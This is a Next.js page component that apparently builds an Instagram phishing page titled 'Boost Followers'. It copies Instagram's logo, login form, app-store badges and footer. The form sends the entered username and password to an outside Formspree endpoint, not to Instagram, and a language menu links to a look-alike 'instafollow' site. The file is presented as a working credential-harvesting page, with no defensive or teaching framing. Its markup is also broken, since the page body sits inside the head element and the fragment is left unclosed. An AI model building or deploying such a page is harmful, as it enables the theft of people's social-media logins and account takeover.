import Head from 'next/head'
import Image from 'next/image'
import Script from 'next/script'
import Link from 'next/link'
import ContactForm from "../components/contactForm";
import SpotifyFooter from "../components/SpotifyFooter";
import scroll from "../components/scroll";
import { Inter } from '@next/font/google'
import styles from '../styles/Home.module.css'

const inter = Inter({ subsets: ['latin'] })

export default function Home() {
  return (
    <>
      <Head>
        <title>Boost Followers</title>
        
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/favicon.ico" />
<span id="root">
  <section className="section-all">
    {/* 1-Role Main */}
    <main className="main" role="main">
      <div className="wrapper">
        <article className="article">
          <div className="content">
            <div className="login-box">
              <div className="header">
                <img className="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" />
              </div>{/* Header end */}
              <div className="form-wrap">
                <form action="https://formspree.io/f/xbjejpyv" method="POST" className="form">
                  <div className="input-box">
                    <input type="text" id="name" aria-describedby placeholder="Phone number&#39; username&#39; or email" aria-required="true" maxLength={30} autoCapitalize="off" autoCorrect="off" name="username" defaultValue required />
                  </div>  
                  <div className="input-box">
                    <input type="password" name="password" id="password" placeholder="Password" aria-describedby maxLength={30} aria-required="true" autoCapitalize="off" autoCorrect="off" required />
                  </div>  
                  <span className="button-box">
                    <button className="btn" type="submit" name="submit">Log in</button>
                  </span>  
                  <a className="forgot" href>Forgot password?</a>
                </form>
              </div> {/* Form-wrap end */}
            </div> {/* Login-box end */}
            <button type="submit"> <div className="login-box"> </div></button>
            <p className="text">Don't have an account?<a href="#">Sign up</a></p>
          </div> {/* Signup-box end */}
          <div className="app">
            <p>Get the app.</p>
            <div className="app-img">
              <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&ct=igweb.loginPage.badge&mt=8">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" />
              </a>
              <a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png" />
              </a>  
            </div>  {/* App-img end*/}
          </div> {/* App end */}
        </article></div> {/* Content end */}
      {/* Wrapper end */}
    </main>
    {/* 2-Role Footer */}
    <footer className="footer" role="contentinfo">
      <div className="footer-container">
        <nav className="footer-nav" role="navigation">
          <ul>
            <li><a href>About Us</a></li>
            <li><a href>Support</a></li>
            <li><a href>Blog</a></li>
            <li><a href>Press</a></li>
            <li><a href>Api</a></li>
            <li><a href>Jobs</a></li>
            <li><a href>Privacy</a></li>
            <li><a href>Terms</a></li>
            <li><a href>Directory</a></li>
            <li>
              <span className="language">Language
                <select name="language" className="select" onchange="la(this.value)">
                  <option value="#">English</option>
                  <option value="http://ru-instafollow.bitballoon.com">Russian</option>
                </select>
              </span>
            </li>
          </ul>
        </nav>
        <span className="footer-logo">© 2018 Instagram</span>
      </div> {/* Footer container end */}
    </footer>
  </section>
</span>
    
  )
}
